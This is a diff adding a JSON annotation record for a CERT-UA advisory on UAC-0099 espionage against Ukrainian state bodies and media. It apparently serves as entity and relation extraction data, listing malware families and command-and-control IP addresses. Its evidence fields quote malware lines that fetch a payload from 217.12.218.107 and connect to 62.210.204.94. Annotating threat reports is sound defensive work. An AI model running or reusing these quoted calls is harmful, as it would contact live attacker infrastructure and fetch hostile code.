@@ -1,0 +1,205 @@
+{
+  "docId": 4818341,
+  "date": "05.06.2023",
+  "title": "UAC-0099: кібершпигунство у відношенні державних організацій та представників ЗМІ України (CERT-UA#6710)",
+  "entities": [
+    {
+      "id": "4818341:0",
+      "name": "України",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe whose organizations and media were targeted.",
+      "scheme": "S6",
+      "category": "Sector",
+      "role": null
+    },
+    {
+      "id": "4818341:1",
+      "name": "LONEPAGE",
+      "kind": "malware family",
+      "gloss": "A PowerShell-based backdoor script that fetches commands and secondary payloads from a C2 server.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "4818341:2",
+      "name": "THUMBCHOP",
+      "kind": "malware family",
+      "gloss": "An information stealer malware targeting data from Chrome and Opera web browsers.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "attacker"
+    },
+    {
+      "id": "4818341:3",
+      "name": "CLOGFLAG",
+      "kind": "malware family",
+      "gloss": "A keylogger malware family used to record keystrokes on compromised systems.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:4",
+      "name": "SEAGLOW",
+      "kind": "malware family",
+      "gloss": "A malware family developed in the Go programming language.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": "related"
+    },
+    {
+      "id": "4818341:5",
+      "name": "OVERJAM",
+      "kind": "malware family",
+      "gloss": "A Go-based reverse proxy malware used for network pivoting and persistence.",
+      "scheme": "S16",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:6",
+      "name": "TOR",
+      "kind": "software product",
+      "gloss": "An open-source anonymity network tool deployed by attackers to create hidden services.",
+      "scheme": "S1",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:7",
+      "name": "SSH",
+      "kind": "software product",
+      "gloss": "A cryptographic network protocol tool used to build reverse remote access connections.",
+      "scheme": "S1",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:8",
+      "name": "wscript.exe",
+      "kind": "software component",
+      "gloss": "A built-in Windows Script Host executable that provides scripting environment support.",
+      "scheme": "S17",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:9",
+      "name": "cscript.exe",
+      "kind": "software component",
+      "gloss": "A command-line version of the Windows Script Host.",
+      "scheme": "S17",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:10",
+      "name": "powershell.exe",
+      "kind": "software component",
+      "gloss": "The command-line shell and scripting framework for Microsoft Windows.",
+      "scheme": "S17",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:11",
+      "name": "mshta.exe",
+      "kind": "software component",
+      "gloss": "A Windows utility responsible for executing Microsoft HTML Application (HTA) files.",
+      "scheme": "S17",
+      "category": "Software",
+      "role": null
+    },
+    {
+      "id": "4818341:12",
+      "name": "Chrome",
+      "kind": "software product",
+      "gloss": "A web browser developed by Google targeted for credential theft.",
+      "scheme": "S1",
+      "category": null,
+      "role": "target"
+    },
+    {
+      "id": "4818341:13",
+      "name": "Opera",
+      "kind": "software product",
+      "gloss": "A multi-platform web browser targeted by info-stealing malware.",
+      "scheme": "S1",
+      "category": null,
+      "role": "target"
+    },
+    {
+      "id": "4818341:14",
+      "name": "156.38.245.115",
+      "kind": "ip address",
+      "gloss": "An IP address used as command-and-control infrastructure.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4818341:15",
+      "name": "179.48.251.182",
+      "kind": "ip address",
+      "gloss": "An IP address associated with malicious threat actor infrastructure.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4818341:16",
+      "name": "217.12.218.107",
+      "kind": "ip address",
+      "gloss": "An IP address hosting malicious scripts and command-and-control endpoints.",
+      "scheme": "S13",
+      "category": null,
+      "role": "related"
+    },
+    {
+      "id": "4818341:17",
+      "name": "45.148.121.6",
+      "kind": "ip address",
+      "gloss": "An IP address hosting malicious scripts and tools.",
+      "scheme": "S13",
+      "category": null,
+      "role": null
+    },
+    {
+      "id": "4818341:18",
+      "name": "62.210.204.94",
+      "kind": "ip address",
+      "gloss": "An IP address used as a network endpoint for malware communication.",
+      "scheme": "S13",
+      "category": null,
+      "role": "related"
+    }
+  ],
+  "relations": [
+    {
+      "head": "THUMBCHOP",
+      "type": "steals-credentials-from",
+      "tail": "Chrome",
+      "evidence": "THUMBCHOP (стілер для Chrome та Opera)"
+    },
+    {
+      "head": "THUMBCHOP",
+      "type": "steals-credentials-from",
+      "tail": "Opera",
+      "evidence": "THUMBCHOP (стілер для Chrome та Opera)"
+    },
+    {
+      "head": "LONEPAGE",
+      "type": "connects-to-ip",
+      "tail": "217.12.218.107",
+      "evidence": "downloaddata('http://217.12.218.107:30139/aMPnGqjRPSQIOZQG/page147/upgrade.txt')"
+    },
+    {
+      "head": "SEAGLOW",
+      "type": "connects-to-ip",
+      "tail": "62.210.204.94",
+      "evidence": "SearchApp.exe\" -ArgumentList \"-s 62.210.204.94\""
+    }
+  ],
+  "unclassified": []
+}
